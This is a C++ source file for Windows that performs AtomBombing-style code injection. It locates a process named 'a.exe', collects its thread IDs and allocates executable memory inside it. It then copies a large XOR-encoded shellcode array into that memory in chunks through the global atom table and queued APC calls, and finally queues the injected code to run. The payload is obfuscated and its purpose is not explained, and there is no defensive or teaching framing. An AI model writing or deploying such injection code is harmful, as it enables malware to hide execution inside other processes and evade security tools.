#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <winternl.h>
#include <string.h>
#include <iostream>
#include <stdio.h>
using std::vector;
vector<DWORD> tids;
typedef ULONG(WINAPI *_NtQueueApcThread)(HANDLE ThreadHandle,
                                         PAPCFUNC ApcRoutine,
                                         PVOID NormalContext,
                                         PVOID SystemArgument1,
                                         PVOID SystemArgument2,
                                         PVOID SystemArgument3);

int findProcess(wchar_t *proc_name)
{
    HANDLE processes = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    if (processes)
    {
        int pid = 0;
        PROCESSENTRY32W process = {0};
        process.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(processes, &process))
        {
            do
            {
                if (!wcsicmp(proc_name, process.szExeFile))
                {
                    THREADENTRY32 thread = {0};
                    thread.dwSize = sizeof(THREADENTRY32);
                    Thread32First(processes, &thread);
                    do
                    {
                        if (thread.th32OwnerProcessID == process.th32ProcessID)
                        {
                            tids.push_back(thread.th32ThreadID);
                        }
                    } while (Thread32Next(processes, &thread));
                    return process.th32ProcessID;
                }

            } while (Process32NextW(processes, &process));
        }
        else
        {
            std::cout << GetLastError() << std::endl;
            exit(0);
        }
    }
    return 0;
}

int main()
{
    LoadLibraryA("User32");
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (ntdll)
    {
        _NtQueueApcThread NtQueueApcThread = (_NtQueueApcThread)GetProcAddress(ntdll, "NtQueueApcThread");
        if (NtQueueApcThread)
        {
            int pid = findProcess(L"a.exe");

            if (pid)
            {
                HANDLE process = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, false, pid);

                if (process)
                {
                    byte shellcode[] = {0x55, 0x48, 0x89, 0xE5, 0x48, 0x31, 0xC9, 0x66, 0xB9, 0x00, 0x00, 0x66, 0x81, 0xF9, 0xDC, 0x03, 0x74, 0x1C, 0x48, 0x8B, 0x45, 0xF8, 0x48, 0x8B, 0x10, 0x48, 0x83, 0xC2, 0x3D, 0x66, 0x01, 0xCA, 0x48, 0x31, 0xC0, 0x8A, 0x02, 0x34, 0x66, 0x88, 0x02, 0x66, 0xFF, 0xC1, 0xEB, 0xDD, 0x48, 0x8B, 0x45, 0xF8, 0x48, 0x8B, 0x18, 0x66, 0x81, 0xC3, 0x68, 0x02, 0xFF, 0xD3, 0xC3,51, 46, 239, 131, 46, 239, 43, 118, 46, 239, 51, 126, 42, 239, 35, 70, 46, 229, 27, 126, 102, 18, 120, 46, 237, 35, 70, 239, 164, 46, 237, 35, 118, 0, 
239, 118, 46, 237, 35, 70, 235, 54, 100, 46, 237, 35, 118, 0, 239, 54, 100, 141, 117, 46, 237, 35, 118, 0, 161, 102, 102, 102, 46, 237, 35, 118, 0, 161, 38, 100, 102, 102, 46, 237, 35, 118, 46, 237, 51, 126, 46, 239, 54, 110, 246, 59, 165, 51, 46, 239, 131, 46, 229, 138, 118, 46, 239, 43, 118, 46, 161, 
35, 158, 106, 102, 102, 102, 161, 35, 146, 102, 102, 102, 102, 141, 88, 46, 237, 35, 158, 46, 220, 251, 126, 76, 2, 197, 140, 121, 133, 46, 105, 201, 182, 237, 35, 146, 46, 5, 174, 46, 237, 35, 118, 46, 103, 174, 105, 208, 102, 46, 105, 216, 166, 46, 103, 164, 46, 222, 153, 153, 153, 153, 153, 153, 153, 102, 46, 71, 182, 46, 103, 35, 158, 229, 35, 146, 103, 237, 35, 146, 46, 5, 182, 46, 237, 35, 118, 46, 103, 182, 105, 208, 102, 226, 166, 19, 200, 46, 
237, 35, 158, 46, 229, 162, 118, 59, 165, 51, 46, 239, 131, 46, 231, 138, 198, 102, 102, 102, 46, 239, 43, 118, 46, 239, 51, 126, 46, 161, 35, 150, 102, 102, 102, 102, 46, 237, 35, 126, 46, 239, 167, 142, 6, 153, 153, 153, 46, 239, 35, 142, 46, 237, 35, 118, 46, 239, 35, 134, 46, 237, 35, 134, 237, 38, 
90, 46, 5, 182, 46, 237, 35, 118, 46, 103, 182, 46, 239, 35, 190, 46, 237, 35, 190, 237, 230, 238, 102, 102, 102, 239, 166, 46, 239, 35, 182, 46, 237, 51, 118, 46, 237, 35, 182, 46, 103, 182, 46, 239, 35, 174, 46, 237, 35, 174, 237, 38, 122, 239, 164, 46, 237, 35, 118, 46, 103, 182, 46, 239, 35, 166, 46, 237, 35, 174, 237, 38, 70, 239, 164, 46, 237, 35, 118, 46, 103, 182, 46, 239, 35, 222, 46, 237, 35, 174, 237, 38, 66, 239, 164, 46, 237, 35, 118, 46, 
103, 182, 46, 239, 35, 214, 161, 35, 154, 102, 102, 102, 102, 143, 245, 102, 102, 102, 237, 35, 154, 46, 235, 114, 227, 102, 102, 102, 102, 46, 237, 35, 222, 46, 103, 182, 237, 102, 239, 35, 202, 237, 51, 202, 46, 237, 35, 118, 46, 103, 182, 46, 239, 35, 198, 46, 237, 35, 198, 46, 239, 35, 254, 46, 161, 35, 246, 102, 102, 102, 102, 46, 237, 35, 254, 46, 239, 167, 142, 241, 152, 153, 153, 46, 239, 35, 238, 46, 237, 35, 238, 46, 93, 35, 142, 19, 38, 237, 35, 154, 46, 235, 114, 102, 46, 237, 35, 214, 46, 103, 182, 105, 209, 102, 105, 209, 166, 46, 235, 114, 227, 102, 102, 102, 102, 46, 237, 35, 166, 46, 
103, 182, 237, 102, 239, 166, 46, 239, 35, 246, 46, 237, 51, 118, 46, 237, 35, 246, 46, 103, 182, 46, 239, 35, 150, 46, 237, 35, 150, 141, 114, 229, 35, 154, 103, 46, 237, 35, 174, 237, 38, 114, 95, 35, 154, 105, 228, 59, 153, 153, 153, 46, 231, 162, 198, 102, 102, 102, 59, 165, 51, 46, 239, 131, 46, 231, 138, 182, 102, 102, 102, 246, 246, 246, 246, 246, 46, 237, 35, 126, 46, 239, 35, 150, 46, 237, 35, 150, 0, 222, 102, 102, 46, 239, 35, 150, 46, 237, 
35, 150, 46, 239, 35, 158, 141, 110, 46, 231, 11, 158, 102, 38, 102, 102, 46, 237, 35, 158, 237, 102, 91, 43, 60, 246, 102, 19, 141, 46, 222, 52, 18, 10, 47, 8, 15, 18, 51, 46, 220, 8, 15, 5, 9, 2, 3, 53, 18, 46, 239, 35, 198, 46, 239, 51, 206, 161, 35, 214, 20, 15, 8, 1, 46, 237, 35, 158, 46, 235, 51, 
198, 46, 239, 167, 142, 73, 152, 153, 153, 46, 239, 35, 142, 46, 222, 51, 102, 21, 102, 3, 102, 20, 102, 46, 239, 35, 244, 46, 222, 20, 102, 85, 102, 84, 102, 102, 102, 46, 239, 35, 254, 46, 235, 51, 244, 46, 235, 35, 166, 39, 222, 106, 102, 102, 102, 46, 239, 167, 142, 79, 155, 153, 153, 46, 222, 42, 2, 20, 42, 9, 7, 2, 34, 46, 239, 35, 225, 161, 35, 232, 34, 10, 10, 102, 46, 237, 35, 158, 46, 235, 51, 225, 46, 239, 167, 142, 178, 155, 153, 153, 46, 239, 35, 134, 46, 237, 35, 134, 46, 235, 235, 30, 153, 153, 153, 46, 235, 51, 166, 47, 239, 175, 47, 239, 182, 220, 102, 102, 102, 102, 223, 102, 102, 102, 102, 153, 182, 46, 222, 43, 3, 21, 21, 7, 1, 3, 36, 46, 239, 227, 10, 153, 153, 153, 161, 227, 18, 153, 153, 153, 9, 30, 39, 102, 46, 237, 227, 30, 153, 153, 153, 46, 235, 243, 10, 153, 153, 153, 46, 239, 167, 142, 24, 155, 153, 153, 46, 239, 35, 190, 161, 227, 14, 153, 153, 153, 34, 47, 35, 102, 46, 222, 34, 47, 35, 34, 47, 35, 34, 47, 46, 220, 35, 34, 47, 35, 34, 47, 35, 34, 46, 239, 227, 54, 153, 153, 153, 46, 239, 243, 62, 153, 153, 153, 46, 222, 35, 34, 47, 35, 34, 47, 35, 102, 46, 239, 227, 56, 153, 153, 153, 42, 237, 51, 190, 46, 235, 243, 14, 153, 153, 153, 46, 235, 227, 54, 153, 153, 153, 
39, 223, 102, 102, 102, 102, 47, 239, 182, 46, 239, 164, 223, 102, 102, 102, 102, 39, 153, 180, 222, 102, 102, 102, 102, 46, 231, 162, 182, 102, 102, 102, 59, 165};
                    byte *cry = (byte *)VirtualAllocEx(process, NULL, 1043, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                    PAPCFUNC GlobalGetAtomNameW_ptr = (PAPCFUNC)GetProcAddress(LoadLibraryA("kernel32.dll"), "GlobalGetAtomNameW");
                    if (cry)
                    {
                        printf("Address at: %x\n", cry);
                        // int diff = 0x4083EC - (int)cry - 65;
                        // memcpy(shellcode + 61,&diff,sizeof(int));
                        int size = 0;
                        HANDLE thread = OpenThread(THREAD_ALL_ACCESS, false, tids[0]);
                        while (size < 1043)
                        {
                            byte* blehhhh = (byte*)malloc(255);
                            if(blehhhh){
                                memset(blehhhh,0,255);
                                memcpy(blehhhh,shellcode+size,1043-size-252 >0?252:1043-size);
                                ATOM atom = GlobalAddAtomW((wchar_t *)blehhhh);
                                if (atom)
                                {
                                    NtQueueApcThread(thread, GlobalGetAtomNameW_ptr, (PVOID)((int)atom), cry+size, (PVOID)252, NULL);
                                }
                                else{
                                    printf("%d\n",GetLastError());
                                }
                                free(blehhhh);
                                atom = NULL;
                            }
                            size += 252;
                        }

                        NtQueueApcThread(thread, (PAPCFUNC)cry, cry, NULL, NULL, NULL);
                        // NtQueueApcThread(thread,VirtualProtect_ptr,cry,(PVOID)116,(PVOID)PAGE_EXECUTE_READ,(PVOID)NULL);
                    }
                }
            }
        }
    }
}
